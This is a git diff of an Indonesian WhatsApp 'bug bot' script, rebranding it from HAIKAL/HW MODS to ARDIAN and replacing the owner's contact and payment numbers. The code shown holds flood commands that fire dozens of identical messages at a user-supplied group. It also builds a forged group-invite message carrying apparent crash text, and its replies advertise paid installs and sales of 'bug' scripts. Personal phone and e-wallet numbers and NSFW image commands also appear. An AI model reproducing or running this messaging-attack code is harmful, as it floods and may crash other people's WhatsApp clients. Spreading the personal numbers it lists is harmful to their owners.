 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1043,10 +1043,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1054,10 +1054,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1065,10 +1065,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1076,10 +1076,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1087,10 +1087,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1098,10 +1098,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1109,10 +1109,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1120,10 +1120,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1131,10 +1131,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1142,10 +1142,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1159,10 +1159,10 @@ case '🌹' : {
 
 Pe = text.split("|")[0]+'@g.us'
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1170,10 +1170,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1181,10 +1181,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1193,10 +1193,10 @@ templateButtons: [
  })
  await sleep(20)
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1204,10 +1204,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1215,10 +1215,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1226,10 +1226,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1237,10 +1237,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1248,10 +1248,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1260,10 +1260,10 @@ templateButtons: [
  })
  await sleep(20)
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1271,10 +1271,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1282,10 +1282,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1293,10 +1293,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1304,10 +1304,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1315,10 +1315,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1326,10 +1326,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1337,10 +1337,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1348,10 +1348,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1377,10 +1377,10 @@ Pe = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "groupInviteMessage": {
-"groupJid": "85296556573-1328272333@g.us",
+"groupJid": "83183387983-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME HW MODS WA${ngazap(prefix)}`,
-"groupName": `MY NAME HW MODS WA${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME ARDIAN MODS WA${ngazap(prefix)}`,
+"groupName": `MY NAME ARDIAN MODS WA${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1425,7 +1425,7 @@ Ketif Of Untuk Menon Aktifkan Fitur Ini
 bugcrot
 bugahay `,
 }
-haikal.sendMessage(m.chat, anuala, `HW MODS WA${ngazap(prefix)}`, m)
+haikal.sendMessage(m.chat, anuala, `ARDIAN MODS WA${ngazap(prefix)}`, m)
 }
 }
 break
@@ -1435,7 +1435,7 @@ if (!AntiNsfww) return m.reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const bugcrot = {
 image: {url:waifudd.data.url},
-caption: `© HW MODS WA${buttonkal}`,
+caption: `© ARDIAN MODS WA${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugcrot, { quoted: m}).catch(err => {
  return('Error!')
@@ -1448,7 +1448,7 @@ m.reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
  const bugahay = {
 image: {url:waifudd.data.url},
-caption: `© HW MODS WA${buttonkal}`,
+caption: `© ARDIAN MODS WA${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugahay, { quoted: m}).catch(err => {
  return('Error!')
@@ -1881,19 +1881,19 @@ break
 //=================================================//
 case 'darkjoke':{
 anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
-haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server haikal sedang down'))
+haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server ardianl sedang down'))
 }
 break
 //=================================================//
 case 'meme':{
 anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
-haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server haikal sedang down'))
+haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server ardian sedang down'))
 }
 break
 //=================================================//
 case 'meme2':{
 anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
-haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server haikal sedang down'))
+haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server ardian sedang down'))
 }
 break
 //=================================================//
@@ -2175,7 +2175,7 @@ break
 case 'whatsapp': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
-Untuk Harga Custom WhatsApp 50k Boleh Request Fitur Tampilam Nama Dan Logo Yah Hub: wa.me/6281214281312`)
+Untuk Harga Custom WhatsApp 50k Boleh Request Fitur Tampilam Nama Dan Logo Yah Hub: wa.me/6283183387983`)
 }
 break
 //=================================================//
@@ -2230,7 +2230,7 @@ RAM 7GB CPU 170%
 40K/Bulan
 
 
-Admin  = wa.me/6281214281312
+Admin  = wa.me/6283183387983
 
 Open Jasa Pasang Bot Bug 
 Dan Jual sc Bug Juga`)
@@ -2260,8 +2260,8 @@ case 'payment': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 haikal
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 
@@ -2276,100 +2276,100 @@ case '5000': case '7k':{
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+5000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+5000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '10000': case '12k': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+10000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+10000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '15000': case '16k': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+15000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+15000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '20000': case '22k': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+20000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+20000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '25000': case '25k': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+25000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+25000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '30000': case '31k': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+300000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+300000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '50000': case '51k': {
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+50000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+50000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '100000': case'99k':{
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+100000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+100000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '150000': case '147k':{
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+150000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+150000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case '200000': case '195k':{
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 [ ] silahkan isi nomor Anda
-Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+200000
+Hub : Wa.me/6283183387983?text=Beli+Pulsa+Mas+Yang+200000
 
-gopay : 081285175912
-Dana : 089653784091`)
+gopay : ×
+Dana : 083183387983`)
 }
 break
 case 'belajarkita': {
@@ -2401,14 +2401,14 @@ Atauu.. Bingung Yah Tenang Ada Kami Jasa Run Bot Via Panel
 Kalian Bisa Hubungi Owner Di Bawah..
 Harga Tergantung Setiap Owner 😉
 
